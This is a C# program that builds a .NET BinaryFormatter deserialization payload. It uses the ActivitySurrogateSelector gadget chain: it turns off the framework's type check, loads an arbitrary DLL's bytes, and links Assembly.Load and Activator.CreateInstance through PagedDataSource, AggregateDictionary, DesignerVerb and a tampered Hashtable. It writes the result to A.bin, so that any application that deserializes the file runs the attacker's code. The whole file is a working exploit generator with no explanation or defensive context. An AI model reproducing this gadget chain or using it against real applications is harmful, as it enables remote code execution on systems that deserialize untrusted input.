using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.IO;
using System.Reflection;
using System.Web.UI.WebControls;
using System.ComponentModel.Design;
using System.Collections;
using System.Web.Security;

class Program
{
    class MySurrogateSelector : SurrogateSelector
    {
        public override ISerializationSurrogate GetSurrogate(Type type,
            StreamingContext context, out ISurrogateSelector selector)
        {
            selector = this;
            if (!type.IsSerializable)
            {
                Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                return (ISerializationSurrogate)Activator.CreateInstance(t);
            }

            return base.GetSurrogate(type, context, out selector);
        }
    }


    static void Main(string[] args)
    {
        System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");
        List<byte[]> dllData = new List<byte[]>();
        byte[] Data = File.ReadAllBytes("Assembly_Demo.dll");
        dllData.Add(Data);
        Func<Assembly, IEnumerable<Type>> transGetTypes = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
        //var LinQuery = dllData.Select(Assembly.Load).SelectMany(transGetTypes).Select(Activator.CreateInstance);
        var e1 = dllData.Select(Assembly.Load);
        var e2 = e1.SelectMany(transGetTypes);
        var e3 = e2.Select(Activator.CreateInstance);


        PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
        IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
        DesignerVerb verb = new DesignerVerb("XYZ", null);
        typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);


     
        Hashtable ht = new Hashtable();

        ht.Add(verb, "Hello");
        ht.Add("Dummy", "Hello2");

        FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
        Array keys = (Array)fi_keys.GetValue(ht);
        FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
        for (int i = 0; i < keys.Length; ++i)
        {
            object bucket = keys.GetValue(i);
            object key = fi_key.GetValue(bucket);
            if (key is string)
            {
                fi_key.SetValue(bucket, verb);
                keys.SetValue(bucket, i);
                break;
            }
        }
        fi_keys.SetValue(ht, keys);



        List<object> TargetSerializeList = new List<object>();

        TargetSerializeList.Add(e1);
        TargetSerializeList.Add(e2);
        TargetSerializeList.Add(e3);
        TargetSerializeList.Add(pds);
        TargetSerializeList.Add(verb);
        TargetSerializeList.Add(dict);
        TargetSerializeList.Add(ht);


        BinaryFormatter formatter = new BinaryFormatter();
        formatter.SurrogateSelector = new MySurrogateSelector();
        using (FileStream stream = new FileStream("A.bin", FileMode.Create, FileAccess.Write, FileShare.None))
        {
            formatter.Serialize(stream, TargetSerializeList);
        }
    
        Console.ReadKey();
    }

}